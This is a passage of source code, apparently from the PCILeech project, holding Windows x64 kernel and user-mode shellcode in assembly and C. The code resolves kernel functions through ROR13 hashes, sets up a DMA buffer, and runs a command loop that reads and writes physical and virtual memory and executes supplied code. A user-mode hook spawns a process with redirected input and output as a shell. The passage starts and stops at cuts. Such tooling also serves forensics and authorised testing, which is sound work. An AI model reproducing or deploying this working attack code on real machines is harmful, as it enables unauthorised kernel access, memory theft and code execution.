	MOV [r13+8], rax
	MOV rax, 048FFFFFFF1058D48h
	MOV [r13+1000h], rax
	MOV rax, 0F07400F88348008Bh
	MOV [r13+1008h], rax
	; ----------------------------------------------------
	; WRITE PHYSICAL MEMORY ADDRESS
	; ----------------------------------------------------
	MOV rcx, r12
	MOV edx, 5a326357h			; H_MmGetPhysicalAddress
	CALL PEGetProcAddressH	
	MOV rcx, r13
	CALL rax
	MOV [data_phys_addr_alloc], eax
	; ----------------------------------------------------
	; JMP INTO ALLOCATED AREA
	; ----------------------------------------------------
	MOV rsp, rbp
	POP rbp
	ADD r13, 1000h
	JMP r13
setup2 ENDP

; ----------------------------------------------------
; Perform ROR13 hashing
; rcx -> string ptr
; rax <- result
; ----------------------------------------------------
HashROR13A PROC
	PUSH rsi
	PUSH rdi
	MOV rsi, rcx
	XOR rdi, rdi
	XOR rax, rax
	CLD
	hash_loop:
	LODSB
	TEST al, al
	JZ hash_loop_finish
	ROR edi, 13
	ADD edi, eax
	JMP hash_loop
	hash_loop_finish:
	MOV eax, edi
	POP rdi
	POP rsi
	RET
HashROR13A ENDP

; ----------------------------------------------------
; Search for PE header given an address. May cause page faults.
; rcx -> scan address
; rax <- header address
; ----------------------------------------------------
PEGetModuleFromAddress_ScanBack PROC
	SHR rcx, 12
	SHL rcx, 12
	address_loop:
	MOV eax, 1000h
	SUB rcx, rax
	MOV ax, [rcx]		; dos header magic
	CMP ax, 5a4dh
	JNE address_loop
	MOV eax, [rcx+60]	; nt header address offset
	CMP eax, 1000h
	JNBE address_loop
	ADD rax, rcx		; nt header address
	MOV eax, [rax]
	CMP eax, 00004550h	; nt header magic
	JNE address_loop
	MOV rax, rcx
	RET
PEGetModuleFromAddress_ScanBack ENDP

; rcx -> module base address
; rdx -> hash of exported function
; rax <- address of exported function
PEGetProcAddressH PROC
	; rdi = PIMAGE_EXPORT_DIRECTORY
	; rsi = counter NumberOfNames
	PUSH rdi
	PUSH rsi
	MOV edi, [rcx+60]	; nt header address offset
	MOV edi, [rdi+rcx+136]
	ADD rdi, rcx		; ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + hModule  
	MOV r8d, [rdi+24]	; PIMAGE_EXPORT_DIRECTORY->NumberOfNames
	XOR rsi, rsi
	find_loop:
	MOV eax, [rdi+32]			; PIMAGE_EXPORT_DIRECTORY->AddressOfNames
	ADD rax, rcx				; PIMAGE_EXPORT_DIRECTORY->AddressOfNames + hModule
	MOV eax, [rax+rsi*4]		; AddressOfNames[index]
	ADD rax, rcx
	PUSH rcx
	MOV rcx, rax
	CALL HashROR13A
	POP rcx
	CMP eax, edx
	JE find_loop_found
	INC rsi
	JMP find_loop
	find_loop_found:
	; found!
	MOV edx, [rdi+36]		; PIMAGE_EXPORT_DIRECTORY->AddressOfNameOrdinals
	ADD rdx, rcx			; PIMAGE_EXPORT_DIRECTORY->AddressOfNameOrdinals + hModule
	XOR rax, rax
	MOV ax, [rdx+rsi*2]		; AddressOfNameOrdinals[index]
	MOV edx, [rdi+28]		; PIMAGE_EXPORT_DIRECTORY->AddressOfFunctions 
	ADD rdx, rcx			; PIMAGE_EXPORT_DIRECTORY->AddressOfFunctions + hModule
	MOV eax, [rdx+rax*4]	; AddressOfFunctions[index]
	ADD rax, rcx			; AddressOfFunctions[index] + hModule
	POP rsi
	POP rdi
	RET
PEGetProcAddressH ENDP

END

```

`pcileech_shellcode/wx64_stage3.asm`:

```asm
; wx64_stage3.asm : assembly to receive execution from stage2 shellcode.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

EXTRN stage3_c_EntryPoint:NEAR

.CODE

main PROC
	; ----------------------------------------------------
	; 1: SAME INITIAL BYTE SEQUENCE AS wx64_stage3_pre.asm
	; ----------------------------------------------------
	label_main_base:
	LEA rax, label_main_base-8h
	MOV rax, [rax]
	CMP rax, 0
	JZ label_main_base
	; ----------------------------------------------------
	; 2: CALL C CODE
	; ----------------------------------------------------
	LEA rcx, label_main_base - 1000h ; address of data page in parameter 1
	PUSH rsi
	MOV rsi, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	CALL stage3_c_EntryPoint
	MOV rsp, rsi
	POP rsi
	RET
main ENDP

END

```

`pcileech_shellcode/wx64_stage3_c.c`:

```c
// wx64_stage3_c.c : stage3 main shellcode.
//
// (c) Ulf Frisk, 2016, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
#include <windows.h>
#pragma warning( disable : 4047 4055 4127)

typedef unsigned __int64		QWORD, *PQWORD;
typedef __int64					PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;

// ----------------------------- KERNEL DEFINES AND TYPEDEFS BELOW -----------------------------

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID;
typedef CLIENT_ID *PCLIENT_ID;

typedef _IRQL_requires_same_ _Function_class_(KSTART_ROUTINE) VOID KSTART_ROUTINE(
	_In_ PVOID StartContext
	);
typedef KSTART_ROUTINE *PKSTART_ROUTINE;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH   Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;
typedef CONST OBJECT_ATTRIBUTES *PCOBJECT_ATTRIBUTES;

typedef enum _MEMORY_CACHING_TYPE {
	MmNonCached = 0,
	MmCached = 1,
	MmWriteCombined = 2,
	MmHardwareCoherentCached = 3,
	MmNonCachedUnordered = 4,
	MmUSWCCached = 5,
	MmMaximumCacheType = 6
} MEMORY_CACHING_TYPE;

typedef struct _PHYSICAL_MEMORY_RANGE {
	PHYSICAL_ADDRESS BaseAddress;
	LARGE_INTEGER NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

typedef enum _MODE {
	KernelMode,
	UserMode,
	MaximumMode
} MODE;

// ----------------------------- ROR13 HASHES BELOW -----------------------------

#define H_ExFreePool							0x9d489d1f
#define H_MmAllocateContiguousMemory			0x9f361ebc
#define H_MmFreeContiguousMemory				0x1345f592
#define H_MmGetPhysicalAddress					0x5a326357
#define H_MmGetPhysicalMemoryRanges				0x4977a56f
#define H_MmMapIoSpace							0x05ddbef9
#define H_MmUnmapIoSpace						0x6c6ec5c9
#define H_PsCreateSystemThread					0x94a06b02
#define H_RtlCopyMemory							0xcf64979b
#define H_RtlZeroMemory							0xc53d4fdb
#define H_ZwProtectVirtualMemory				0xbc3f4d89
#define H_KeDelayExecutionThread				0x58586d92

// ----------------------------- SHELLCODE DEFINES AND TYPEDEFS BELOW (STAGE2) -----------------------------

#undef RtlCopyMemory
typedef struct tdNTOS {
	VOID(*ExFreePool)(
		_In_ PVOID P
		);
	VOID(*MmFreeContiguousMemory)(
		_In_ PVOID BaseAddress
		);
	PVOID(*MmAllocateContiguousMemory)(
		_In_ SIZE_T NumberOfBytes,
		_In_ PHYSICAL_ADDRESS HighestAcceptableAddress
		);
	PHYSICAL_ADDRESS(*MmGetPhysicalAddress)(
		_In_ PVOID BaseAddress
		);
	PPHYSICAL_MEMORY_RANGE(*MmGetPhysicalMemoryRanges)(
		VOID
		);
	PVOID(*MmMapIoSpace)(
		_In_  PHYSICAL_ADDRESS    PhysicalAddress,
		_In_  SIZE_T              NumberOfBytes,
		_In_  MEMORY_CACHING_TYPE CacheType
		);
	VOID(*MmUnmapIoSpace)(
		_In_  PVOID  BaseAddress,
		_In_  SIZE_T NumberOfBytes
		);
	NTSTATUS(*PsCreateSystemThread)(
		_Out_      PHANDLE            ThreadHandle,
		_In_       ULONG              DesiredAccess,
		_In_opt_   POBJECT_ATTRIBUTES ObjectAttributes,
		_In_opt_   HANDLE             ProcessHandle,
		_Out_opt_  PCLIENT_ID         ClientId,
		_In_       PKSTART_ROUTINE    StartRoutine,
		_In_opt_   PVOID              StartContext
		);
	VOID(*RtlCopyMemory)(
		_Out_       VOID UNALIGNED *Destination,
		_In_  const VOID UNALIGNED *Source,
		_In_        SIZE_T         Length
		);
	NTSTATUS(*ZwProtectVirtualMemory)(
		_In_ HANDLE ProcessHandle,
		_Inout_ PVOID *BaseAddress,
		_Inout_ PSIZE_T RegionSize,
		_In_ ULONG NewProtect,
		_Out_ PULONG OldProtect
		);
	NTSTATUS(*KeDelayExecutionThread)(
		_In_ MODE            WaitMode,
		_In_ BOOLEAN         Alertable,
		_In_ PINT64          pllInterval_Neg100ns
		);
	QWORD ReservedFutureUse[21];
} NTOS, *PNTOS;

#define KMDDATA_OPERATING_SYSTEM_WINDOWS		0x01

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 003
*/
typedef struct tdKMDDATA {
	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/MACOS).
	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
	QWORD DMAAddrVirtual;			// [0x028] virtual address of DMA buffer.
	QWORD _status;					// [0x030] status of operation
	QWORD _result;					// [0x038] result of operation TRUE|FALSE
	QWORD _address;					// [0x040] address to operate on.
	QWORD _size;					// [0x048] size of operation / data in DMA buffer.
	QWORD OperatingSystem;			// [0x050] operating system type
	QWORD ReservedKMD[8];			// [0x058] reserved for specific kmd data (dependant on KMD version).
	QWORD ReservedFutureUse1[13];	// [0x098] reserved for future use.
	QWORD dataInExtraLength;		// [0x100] length of extra in-data.
	QWORD dataInExtraOffset;		// [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
	QWORD dataIn[28];				// [0x120]
	QWORD dataOutExtraLength;		// [0x200] length of extra out-data.
	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra out-data. 
	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
	QWORD dataOut[28];				// [0x220]
	NTOS fn;						// [0x300] used by shellcode to store function pointers.
	CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
	CHAR ReservedFutureUse2[252];
	CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
	CHAR ReservedFutureUse3[252];
	QWORD ReservedFutureUse4[255];	// [0x800]
	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

VOID stage3_c_MainCommandLoop(PKMDDATA pk);

// ----------------------------- SHELLCODE FUNCTIONS BELOW (STAGE2) -----------------------------

DWORD HashROR13A(_In_ LPCSTR sz)
{
	DWORD dwVal, dwHash = 0;
	while(*sz) {
		dwVal = (DWORD)*sz++;
		dwHash = (dwHash >> 13) | (dwHash << 19);
		dwHash += dwVal;
	}
	return dwHash;
}

/*
* Lookup a function and return it, if found.
* -- hModule
* -- dwProcNameH
* -- return
*/
QWORD PEGetProcAddressH(_In_ QWORD hModule, _In_ DWORD dwProcNameH)
{
	PDWORD pdwRVAAddrNames, pdwRVAAddrFunctions;
	PWORD pwNameOrdinals;
	DWORD i, dwFnIdx, dwHash;
	LPSTR sz;
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule; // dos header.
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(hModule + dosHeader->e_lfanew); // nt header
	PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + hModule);
	pdwRVAAddrNames = (PDWORD)(hModule + exp->AddressOfNames);
	pwNameOrdinals = (PWORD)(hModule + exp->AddressOfNameOrdinals);
	pdwRVAAddrFunctions = (PDWORD)(hModule + exp->AddressOfFunctions);
	for(i = 0; i < exp->NumberOfNames; i++) {
		sz = (LPSTR)(hModule + pdwRVAAddrNames[i]);
		dwHash = HashROR13A(sz);
		if(dwHash == dwProcNameH) {
			dwFnIdx = pwNameOrdinals[i];
			if(dwFnIdx >= exp->NumberOfFunctions) { return 0; }
			return hModule + pdwRVAAddrFunctions[dwFnIdx];
		}
	}
	return 0;
}

/*
* C entry point of the stage3 code.
*/
VOID stage3_c_EntryPoint(PKMDDATA pk)
{
	pk->MAGIC = 0x0ff11337711333377;
	pk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_WINDOWS;
	DWORD i = 0, NAMES[32];
	NAMES[i++] = H_ExFreePool;
	NAMES[i++] = H_MmFreeContiguousMemory;
	NAMES[i++] = H_MmAllocateContiguousMemory;
	NAMES[i++] = H_MmGetPhysicalAddress;
	NAMES[i++] = H_MmGetPhysicalMemoryRanges;
	NAMES[i++] = H_MmMapIoSpace;
	NAMES[i++] = H_MmUnmapIoSpace;
	NAMES[i++] = H_PsCreateSystemThread;
	NAMES[i++] = H_RtlCopyMemory;
	NAMES[i++] = H_ZwProtectVirtualMemory;
	NAMES[i++] = H_KeDelayExecutionThread;
	while(i) {
		i--;
		*((PQWORD)&pk->fn + i) = PEGetProcAddressH(pk->AddrKernelBase, NAMES[i]);
	}
	stage3_c_MainCommandLoop(pk);
}

// ----------------------------- SHELLCODE FUNCTIONS BELOW (STAGE2 - THREAD START) -----------------------------

#define KMD_CMD_VOID			0xffff
#define KMD_CMD_COMPLETED		0
#define KMD_CMD_READ			1
#define KMD_CMD_WRITE			2
#define KMD_CMD_TERMINATE		3
#define KMD_CMD_MEM_INFO		4
#define KMD_CMD_EXEC		    5
#define KMD_CMD_READ_VA			6
#define KMD_CMD_WRITE_VA		7
#define KMD_CMD_EXEC_EXTENDED	8

// status:
//     1: ready for command
//     2: processing
//     f0000000: terminated
//     f0000000+: error
// op: - see KMD_CMD defines
// result:
//    0: FALSE
//    1: TRUE
// address:
//    physical base address for memory operation
// size:
//    size of memory operation
VOID stage3_c_MainCommandLoop(PKMDDATA pk)
{
	LONGLONG llTimeToWait = -10000; // 1000 uS (negative multiples of 100ns)
	PVOID pvBufferOutDMA;
	PVOID pvMM = NULL;
	PPHYSICAL_MEMORY_RANGE pMemMap;
	QWORD i, idleCount = 0;
	// 1: set up mem out dma area 16MB//4MB in lower 4GB
	pk->DMASizeBuffer = 0x1000000;
	pvBufferOutDMA = pk->fn.MmAllocateContiguousMemory(0x01000000, 0xffffffff);
	if(!pvBufferOutDMA) {
		pk->DMASizeBuffer = 0x00400000;
		pvBufferOutDMA = pk->fn.MmAllocateContiguousMemory(0x00400000, 0xffffffff);
	}
	if(!pvBufferOutDMA) {
		pk->DMASizeBuffer = 0;
		pk->_status = 0xf0000001;
		return;
	}
	pk->DMAAddrVirtual = (QWORD)pvBufferOutDMA;
	pk->DMAAddrPhysical = pk->fn.MmGetPhysicalAddress(pvBufferOutDMA);
	// 2: main dump loop
	while(TRUE) {
		pk->_status = 1;
		if(KMD_CMD_COMPLETED == pk->_op) { // NOP
			idleCount++;
			// thread wait after X number of idle loops - TODO: change to timing
			if(idleCount > 10000000000) {
				pk->fn.KeDelayExecutionThread(KernelMode, FALSE, &llTimeToWait);
			}
			continue;
		}
		pk->_status = 2;
		if(KMD_CMD_TERMINATE == pk->_op) { // EXIT
			pk->_status = 0xf0000000;
			pk->fn.MmFreeContiguousMemory(pvBufferOutDMA);
			pk->DMAAddrPhysical = 0;
			pk->DMAAddrVirtual = 0;
			pk->_result = TRUE;
			pk->MAGIC = 0;
			pk->_op = KMD_CMD_COMPLETED;
			return;
		}
		if(KMD_CMD_MEM_INFO == pk->_op) { // INFO (physical section map)
			pMemMap = pk->fn.MmGetPhysicalMemoryRanges();
			if(pMemMap == NULL) {
				pk->_result = FALSE;
			} else {
				for(i = 0; (pMemMap[i].BaseAddress) || (pMemMap[i].NumberOfBytes.QuadPart); i++);
				pk->_size = i * sizeof(PHYSICAL_MEMORY_RANGE);
				pk->fn.RtlCopyMemory(pvBufferOutDMA, pMemMap, pk->_size);
				pk->fn.ExFreePool(pMemMap);
				pk->_result = TRUE;
			}
		}
		if(KMD_CMD_EXEC == pk->_op) { // EXEC at start of buffer
			((VOID(*)(_In_ PKMDDATA pk, _In_ PQWORD dataIn, _Out_ PQWORD dataOut))pvBufferOutDMA)(pk, pk->dataIn, pk->dataOut);
			pk->_result = TRUE;
		}
		if(KMD_CMD_READ == pk->_op || KMD_CMD_WRITE == pk->_op) { // PHYSICAL MEMORY READ/WRITE
			pvMM = pk->fn.MmMapIoSpace(pk->_address, pk->_size, 0);
			if(pvMM) {
				if(KMD_CMD_READ == pk->_op) { // READ
					pk->fn.RtlCopyMemory(pvBufferOutDMA, pvMM, pk->_size);
				} else { // WRITE
					pk->fn.RtlCopyMemory(pvMM, pvBufferOutDMA, pk->_size);
				}
				pk->fn.MmUnmapIoSpace(pvMM, pk->_size);
				pk->_result = TRUE;
			} else {
				pk->_result = FALSE;
			}
		}
		if(KMD_CMD_READ_VA == pk->_op) { // READ Virtual Address
			pk->fn.RtlCopyMemory(pvBufferOutDMA, (PVOID)pk->_address, pk->_size);
			pk->_result = TRUE;
		}
		if(KMD_CMD_WRITE_VA == pk->_op) { // WRITE Virtual Address
			pk->fn.RtlCopyMemory((PVOID)pk->_address, pvBufferOutDMA, pk->_size);
			pk->_result = TRUE;
		}
		pk->_op = KMD_CMD_COMPLETED;
		idleCount = 0;
	}
}

```

`pcileech_shellcode/wx64_stage3_pre.asm`:

```asm
; wx64_stage3_pre.asm : assembly wait loop to wait for continue when executable code exists after
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

; -------------------------------------
; Prototypes
; -------------------------------------
main PROTO 

; -----------------------------------------------------------------------------
; Code
; -----------------------------------------------------------------------------
.CODE

main PROC
	label_main_base:
	LEA rax, label_main_base-8h
	MOV rax, [rax]
	CMP rax, 0
	JZ label_main_base
main ENDP

; -----------------------------------------------------------------------------
; Compiles into:
; 48 8D 05 F1 FF FF FF 48  8B 00 48 83 F8 00 74 F0
; -----------------------------------------------------------------------------

END

```

`pcileech_shellcode/wx64_umd_exec.asm`:

```asm
; wx64_umd_exec.asm : assembly to receive execution from initial hook in user-mode shellcode (umd).
;
; (c) Ulf Frisk, 2019
; Author: Ulf Frisk, pcileech@frizk.net
;

EXTRN c_EntryPoint:NEAR

.CODE

main PROC
	; ----------------------------------------------------
	; 1: SAVE ORIGINAL PARAMETERS - MAX 3 PARAMS IN FNCALL
	;    OF HOOKED FUNCTION IS CURRENTLY SUPPORTED ...
	; ----------------------------------------------------
	PUSH rcx
	PUSH rdx
	PUSH r8
	PUSH r9
	JMP main_continue
	; ----------------------------------------------------
	; 0: ADDRESS OF ORIGINAL CODE AND MAIN CONTEXT (IN RW SECTION)
	; ----------------------------------------------------
	addr_main_context					dq 1111111111111111h	; offset 0x08
	addr_orig_code						dq 2222222222222222h	; offset 0x10
	; ----------------------------------------------------
	; 2: ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	main_continue:
	PUSH rax
	MOV al, 00h
	MOV dl, 01h
	MOV rcx, [addr_main_context]
	LOCK CMPXCHG [rcx], dl
	JNE skipcall
	; ----------------------------------------------------
	; 4: CALL MAIN SETUP CODE
	; ----------------------------------------------------
	MOV rcx, [addr_main_context]
	SUB rsp, 30h
	CALL c_EntryPoint
	ADD rsp, 30h
	; ----------------------------------------------------
	; 5: RESTORE AND JMP BACK
	; ----------------------------------------------------
	skipcall:
	POP rax
	POP r9
	POP r8
	POP rdx
	POP rcx
	JMP [addr_orig_code]
main ENDP

END

```

`pcileech_shellcode/wx64_umd_exec_c.c`:

```c
// wx64_umd_exec_c.c : usermode 'umd' shellcode for PCILeech for starting and
//                     and executing a process optionally with input redirect.
//                     NB! this feature is still 'experimental'. 
//
// (c) Ulf Frisk, 2019
// Author: Ulf Frisk, pcileech@frizk.net
//
/*

COMPILE WITH:

cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /c /TC wx64_umd_exec_c.c
ml64 wx64_umd_exec.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main "wx64_umd_exec_c.obj"
shellcode64.exe -o wx64_umd_exec.exe

*/
#include <windows.h>

typedef unsigned __int64		QWORD, *PQWORD;

/*
typedef struct tdUMD_EXEC_CONTEXT_LIMITED {
    CHAR fCMPXCHG;
    CHAR fEnableConsoleRedirect;            // config value set by pcileech
    CHAR fThreadIsActive;;
    CHAR fStatus;
    DWORD dwFlagsCreateProcessA;            // config value set by pcileech
    QWORD qwDEBUG;
    QWORD pInfoIn;
    QWORD pInfoOut;
    HANDLE hInWrite;
    HANDLE hOutRead;
    HANDLE hOutWriteCP;
    HANDLE hInReadCP;
    HANDLE hProcessHandle;
    struct {                                // config value set by pcileech
        QWORD CloseHandle;
        QWORD CreatePipe;
        QWORD CreateProcessA;
        QWORD CreateThread;
        QWORD GetExitCodeProcess;
        QWORD ReadFile;
        QWORD Sleep;
        QWORD WriteFile;
        QWORD LocalAlloc;
    } fn;
    CHAR szProcToStart[MAX_PATH];           // config value set by pcileech
} UMD_EXEC_CONTEXT_LIMITED, *PUMD_EXEC_CONTEXT_LIMITED;
*/

#define USERSHELL_BUFFER_IO_MAGIC       0x012651232dfef9521
#define USERSHELL_BUFFER_IO_MAGIC_EXIT  0x0feda22001337daac
#define USERSHELL_BUFFER_IO_SIZE        0x800
typedef struct tUSERSHELLBUFFERIO {
    QWORD qwMagic;
    QWORD cbRead;
    QWORD cbReadAck;
    QWORD qwDebug[10];
    BYTE  pb[];
} USERSHELL_BUFFER_IO, *PUSERSHELL_BUFFER_IO;

typedef struct tdUMD_EXEC_CONTEXT_HANDLES {
    HANDLE hInWrite;
    HANDLE hOutRead;
    HANDLE hOutWriteCP;
    HANDLE hInReadCP;
} UMD_EXEC_CONTEXT_HANDLES, *PUMD_EXEC_CONTEXT_HANDLES;

typedef struct tdUMD_EXEC_CONTEXT_FULL {
    CHAR fCMPXCHG;
    CHAR fEnableConsoleRedirect;            // config value set by pcileech
    CHAR fThreadIsActive;
    CHAR fStatus;
    DWORD dwFlagsCreateProcessA;            // config value set by pcileech
    QWORD qwDEBUG;
    PUSERSHELL_BUFFER_IO pInfoIn;
    PUSERSHELL_BUFFER_IO pInfoOut;
    HANDLE hInWrite;
    HANDLE hOutRead;
    HANDLE hOutWriteCP;
    HANDLE hInReadCP;
    HANDLE hProcessHandle;
    struct {                                // config value set by pcileech
        BOOL(*CloseHandle)(
            HANDLE hObject
            );
        BOOL(*CreatePipe)(
            _Out_    PHANDLE               hReadPipe,
            _Out_    PHANDLE               hWritePipe,
            _In_opt_ LPSECURITY_ATTRIBUTES lpPipeAttributes,
            _In_     DWORD                 nSize
            );
        BOOL(*CreateProcessA)(
            LPCSTR                lpApplicationName,
            LPSTR                 lpCommandLine,
            LPSECURITY_ATTRIBUTES lpProcessAttributes,
            LPSECURITY_ATTRIBUTES lpThreadAttributes,
            BOOL                  bInheritHandles,
            DWORD                 dwCreationFlags,
            LPVOID                lpEnvironment,
            LPCSTR                lpCurrentDirectory,
            LPSTARTUPINFOA        lpStartupInfo,
            LPPROCESS_INFORMATION lpProcessInformation
            );
        HANDLE(*CreateThread)(
            LPSECURITY_ATTRIBUTES   lpThreadAttributes,
            SIZE_T                  dwStackSize,
            LPTHREAD_START_ROUTINE  lpStartAddress,
            __drv_aliasesMem LPVOID lpParameter,
            DWORD                   dwCreationFlags,
            LPDWORD                 lpThreadId
            );
        BOOL(*GetExitCodeProcess)(
            HANDLE  hProcess,
            LPDWORD lpExitCode
            );
        BOOL(*ReadFile)(
            HANDLE       hFile,
            LPVOID       lpBuffer,
            DWORD        nNumberOfBytesToRead,
            LPDWORD      lpNumberOfBytesRead,
            LPOVERLAPPED lpOverlapped
            );
        void(*Sleep)(
            DWORD dwMilliseconds
            );
        BOOL(*WriteFile)(
            HANDLE       hFile,
            LPCVOID      lpBuffer,
            DWORD        nNumberOfBytesToWrite,
            LPDWORD      lpNumberOfBytesWritten,
            LPOVERLAPPED lpOverlapped
            );
        HLOCAL(*LocalAlloc)(
            UINT   uFlags,
            SIZE_T uBytes
            );
    } fn;
    CHAR szProcToStart[MAX_PATH];           // config value set by pcileech
} UMD_EXEC_CONTEXT_FULL, *PUMD_EXEC_CONTEXT_FULL;

BOOL UserShellIsProcessRunning(PUMD_EXEC_CONTEXT_FULL ctx)
{
    DWORD dwExit;
    return ctx->fn.GetExitCodeProcess(ctx->hProcessHandle, &dwExit) && (dwExit == STILL_ACTIVE);
}

VOID UserShellCleanup(PUMD_EXEC_CONTEXT_FULL ctx)
{
    ctx->pInfoOut->qwMagic = 0;
    if(ctx->fThreadIsActive) {
        ctx->fThreadIsActive = 0;
        ctx->fn.CloseHandle(ctx->hOutRead);
        ctx->fn.CloseHandle(ctx->hInWrite);
        ctx->fn.CloseHandle(ctx->hOutWriteCP);
        ctx->fn.CloseHandle(ctx->hInReadCP);
    }
    ctx->pInfoIn->qwMagic = USERSHELL_BUFFER_IO_MAGIC_EXIT;
    ctx->pInfoOut->qwMagic = USERSHELL_BUFFER_IO_MAGIC_EXIT;
}

/*
* Execute binary specified in configuration
*/
inline BOOL UserShellExec(PUMD_EXEC_CONTEXT_FULL ctx)
{
    LPSTARTUPINFO psi = ctx->fn.LocalAlloc(LMEM_ZEROINIT, sizeof(STARTUPINFO));
    //STARTUPINFO si;
    PROCESS_INFORMATION pi;
    // set up data
    psi->cb = sizeof(STARTUPINFO);
    psi->dwFlags = STARTF_USESTDHANDLES;
    if(ctx->fEnableConsoleRedirect) {
        psi->hStdOutput = ctx->hOutWriteCP;
        psi->hStdInput = ctx->hInReadCP;
        psi->hStdError = ctx->hOutWriteCP;
    }
    // launch executable
    if(!ctx->fn.CreateProcessA(NULL, ctx->szProcToStart, NULL, NULL, TRUE, ctx->dwFlagsCreateProcessA, NULL, NULL, psi, &pi)) {
        return FALSE;
    }
    ctx->hProcessHandle = pi.hProcess;
    if(ctx->fEnableConsoleRedirect) {
        ctx->fn.CloseHandle(pi.hThread);
    }
    return TRUE;
}

// in buffer -> child process
VOID UserShellThreadWriter(PUMD_EXEC_CONTEXT_FULL ctx)
{
    DWORD cbWrite, cbModulo, cbModuloAck;
    while(ctx->fThreadIsActive && UserShellIsProcessRunning(ctx)) {
        if(ctx->pInfoIn->cbRead == ctx->pInfoOut->cbReadAck) {
            ctx->fn.Sleep(10);
            continue;
        }
        cbModulo = ctx->pInfoIn->cbRead % USERSHELL_BUFFER_IO_SIZE;
        cbModuloAck = ctx->pInfoOut->cbReadAck % USERSHELL_BUFFER_IO_SIZE;
        if(cbModuloAck < cbModulo) {
            if(!ctx->fn.WriteFile(ctx->hInWrite, ctx->pInfoIn->pb + cbModuloAck, cbModulo - cbModuloAck, &cbWrite, NULL)) {
                break;
            }
        } else {
            if(!ctx->fn.WriteFile(ctx->hInWrite, ctx->pInfoIn->pb + cbModuloAck, USERSHELL_BUFFER_IO_SIZE - cbModuloAck, &cbWrite, NULL)) {
                break;
            }
        }
        ctx->pInfoOut->cbReadAck += cbWrite;
    }
    UserShellCleanup(ctx);
}

// child process -> out buffer
VOID UserShellThreadReader(PUMD_EXEC_CONTEXT_FULL ctx)
{
    DWORD cbRead, cbModulo, cbModuloAck;
    while(ctx->fThreadIsActive && UserShellIsProcessRunning(ctx)) {
        cbModulo = ctx->pInfoOut->cbRead % USERSHELL_BUFFER_IO_SIZE;
        cbModuloAck = ctx->pInfoIn->cbReadAck % USERSHELL_BUFFER_IO_SIZE;
        if(cbModuloAck <= cbModulo) {
            if(!ctx->fn.ReadFile(ctx->hOutRead, ctx->pInfoOut->pb + cbModulo, USERSHELL_BUFFER_IO_SIZE - cbModulo, &cbRead, NULL)) {
                break;
            }
        } else {
            if(!ctx->fn.ReadFile(ctx->hOutRead, ctx->pInfoOut->pb + cbModulo, cbModuloAck - cbModuloAck, &cbRead, NULL)) {
                break;
            }
        }
        ctx->pInfoOut->cbRead += cbRead;
        while(((ctx->pInfoOut->cbRead - ctx->pInfoIn->cbReadAck) >= USERSHELL_BUFFER_IO_SIZE) && ctx->fThreadIsActive && UserShellIsProcessRunning(ctx)) {
            ctx->fn.Sleep(10);
        }
    }
    UserShellCleanup(ctx);
}

VOID c_EntryPoint(PUMD_EXEC_CONTEXT_FULL ctx)
{
    SECURITY_ATTRIBUTES sa;
    if(!ctx->fn.CloseHandle) { return; } // no function addresses -> invalid context!
    // Intialize console redirection #1/2
    if(ctx->fEnableConsoleRedirect) {
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;
        ctx->pInfoIn = (PUSERSHELL_BUFFER_IO)ctx->fn.LocalAlloc(LMEM_ZEROINIT, 0x2000);
        ctx->pInfoOut = (PUSERSHELL_BUFFER_IO)(0x1000 + (QWORD)ctx->pInfoIn);
        ctx->pInfoIn->qwMagic = USERSHELL_BUFFER_IO_MAGIC;
        ctx->pInfoOut->qwMagic = USERSHELL_BUFFER_IO_MAGIC;
